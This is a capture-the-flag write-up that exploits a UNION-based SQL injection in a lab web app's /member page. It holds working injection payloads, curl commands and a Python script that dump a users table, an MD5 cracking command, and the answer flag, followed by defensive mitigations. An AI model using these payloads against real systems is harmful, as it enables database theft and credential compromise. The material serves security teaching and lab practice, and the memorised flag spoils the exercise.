# SQL Injection in `/member` — Professional Exploit Guide

> **LinkedIn:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)

---

## Learning Objectives

- UNION-based SQL injection exploitation
- Database schema enumeration via `information_schema`
- MD5 hash cracking to plaintext
- Post-processing: lowercase normalization and SHA-256 hashing

---

## Required Tools

| Tool | Purpose |
|------|---------|
| `sqlmap` | Automated SQL injection scanner |
| `curl` | Manual HTTP request crafting |
| `grep` | Output filtering |
| `Python 3` | Automation scripting |
| `John the Ripper` | MD5 hash cracking |
| `Burp Suite` | Request interception & replay |

---

## Prerequisites

- Understanding of SQL and relational databases
- Familiarity with web application architecture and HTTP
- Basic command-line proficiency

---

## Vulnerability Overview

| Property | Value |
|----------|-------|
| **Parameter** | `id` (numeric) |
| **Endpoint** | `/?page=member&id=<input>` |
| **Vulnerability** | UNION-based SQL injection |
| **CVSS Score** | 9.1 (Critical) |
| **Impact** | Complete database compromise, credential theft |

The application constructs a SQL query by directly concatenating user input:

```sql
SELECT * FROM members WHERE id = <user_input>;
```

No parameterization or input validation is applied, enabling classic UNION-based injection.

> **Note:** In MySQL, `id = 0 = 0` is parsed left-to-right as `(id = 0) = 0`. For any row where `id ≠ 0`, the expression `id = 0` evaluates to `0`, and `0 = 0` is `1` (true), so these rows are returned. This effectively returns all rows where `id != 0`.

---

## Step-by-Step Exploitation

### Step 1 — Identify the Injection Point

Supply a tautology `id=0=0` to return all non-zero rows:

```
GET /?page=member&id=0=0
```

In MySQL, `WHERE id = 0 = 0` parses as `WHERE (id = 0) = 0`. For every row where `id ≠ 0`, the sub-expression `id = 0` is `0`, and `0 = 0` is `1` (true) — so those rows are returned.

---

### Step 2 — Determine Column Count via UNION

Try a `UNION SELECT` with one column — if it errors, increase until the query succeeds:

```
/?page=member&id=0=0 UNION SELECT table_name FROM information_schema.tables
```

An SQL error reveals the expected column count. In this application it is **2**.

---

### Step 3 — Enumerate Tables

With the column count confirmed, list all tables:

```
/?page=member&id=0=0 UNION SELECT table_name, table_type FROM information_schema.tables
```

Scan the output for interesting tables. The `users` table is visible in the results.

---

### Step 4 — Enumerate Columns in `users`

Pull column names for the `users` table:

```
/?page=member&id=0=0 UNION SELECT column_name, table_name
  FROM information_schema.columns WHERE table_name='users'
```

Columns discovered:

- `first_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

---

### Step 5 — Dump All User Data

Use a multi-UNION query to dump every column at once:

```bash
curl "http://localhost:8080/?page=member&\
id=0%3D0+\
UNION+SELECT+first_name%2C+town+FROM+users+\
UNION+SELECT+first_name%2C+country+FROM+users+\
UNION+SELECT+first_name%2C+planet+FROM+users+\
UNION+SELECT+first_name%2C+Commentaire+FROM+users+\
UNION+SELECT+first_name%2C+countersign+FROM+users"
```

---

### Step 6 — Extract the Target Hash

Filter rows where `first_name = 'Flag'`:

| Column | Value |
|--------|-------|
| `town` | `GetThe` |
| `country` | `42` |
| `Commentaire` | *Decrypt this password → then lower all the char. Sh256 on it and it's good!* |
| `countersign` | `5ff9d0165b4f92b14994e5c685cdce28` |

---

### Step 7 — Crack the MD5 Hash

The `countersign` is an MD5 hash. Crack it with John the Ripper:

```bash
echo '5ff9d0165b4f92b14994e5c685cdce28' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Recovered plaintext:** `FortyTwo`

---

### Step 8 — Normalize and Compute SHA-256

Per the instructions, lowercase the plaintext and compute its SHA-256 digest:

```bash
echo -n "FortyTwo" \
  | tr '[:upper:]' '[:lower:]' \
  | sha256sum \
  | awk '{print $1}'
```

**Flag:** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---

## Python Automation Script

The script `Resources/exploit_members.py` automates steps 1–6:

```python
#!/usr/bin/env python3
import requests, urllib.parse, re, sys

def exploit_members(base_url):
    # Step 1-5: Enumerate database and dump all user data
    payload = (
        "0=0 UNION SELECT first_name, town FROM users "
        "UNION SELECT first_name, country FROM users "
        "UNION SELECT first_name, planet FROM users "
        "UNION SELECT first_name, Commentaire FROM users "
        "UNION SELECT first_name, countersign FROM users"
    )
    url = f"{base_url.rstrip('/')}/?page=member&id={urllib.parse.quote(payload)}"
    resp = requests.get(url)
    resp.raise_for_status()

    # Step 6: Extract Flag entries
    flags = []
    for block in re.findall(r'<pre>(.*?)</pre>', resp.text, re.DOTALL):
        m = re.search(r'First name:\s*(\w+)<br>\s*Surname\s*:\s*(.+)', block)
        if m and m.group(1) == "Flag":
            flags.append(m.group(2).strip())

    print("[*] Instructions:  ", flags[1])
    print("[*] Countersign MD5:", flags[-1])

if __name__ == "__main__":
    exploit_members(sys.argv[1])
```

**Usage:**

```bash
python3 Resources/exploit_members.py http://localhost:8080
```

---

## Database Enumeration Code Examples

### List all tables

```bash
curl -s "http://localhost:8080/?page=member&id=0%3D0+UNION+SELECT+table_name,table_type+FROM+information_schema.tables" \
  | grep -oP '(?<=Surname : ).*'
```

### List columns for a specific table

```bash
curl -s "http://localhost:8080/?page=member&id=0%3D0+UNION+SELECT+column_name,table_name+FROM+information_schema.columns+WHERE+table_name%3D%27users%27" \
  | grep -oP '(?<=Surname : ).*'
```

### Dump users table in one query

```bash
TARGET="http://localhost:8080"
curl -s "${TARGET}/?page=member&id=0%3D0+\
UNION+SELECT+first_name,countersign+FROM+users" \
  | grep "Surname"
```

---

## Defensive Mitigations

### 1. Parameterized Queries (Prepared Statements)

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=darkly', $user, $pass);
$stmt = $pdo->prepare('SELECT * FROM members WHERE id = :id');
$stmt->execute([':id' => (int) $_GET['id']]);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

### 2. Input Validation — Type Checking and Whitelist

```php
<?php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id === null) {
    http_response_code(400);
    exit('Invalid member ID.');
}
```

### 3. Least-Privilege Database User

```sql
-- Grant only SELECT on the members table, nothing else
GRANT SELECT ON darkly.members TO 'app_user'@'localhost';
REVOKE ALL ON information_schema.* FROM 'app_user'@'localhost';
```

### 4. Suppress Verbose SQL Errors in Production

```php
<?php
// php.ini / runtime
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', '/var/log/php_errors.log');
```

---

## Key Takeaways

1. **Never concatenate user input into SQL queries** — always use parameterized statements.
2. **UNION injection** can expose the entire database schema in a single request.
3. **MD5 is cryptographically broken** — MD5 lacks built-in salting and is extremely fast to compute, making brute-force and rainbow table attacks practical even against complex passwords. Never use MD5 for password storage.
4. **Verbose SQL errors** leak schema details that accelerate exploitation.
5. **Least-privilege DB accounts** limit damage even when injection succeeds.

---

## References & Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [sqlmap documentation](https://sqlmap.org/)
- [John the Ripper](https://www.openwall.com/john/)

---

> **Author:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)
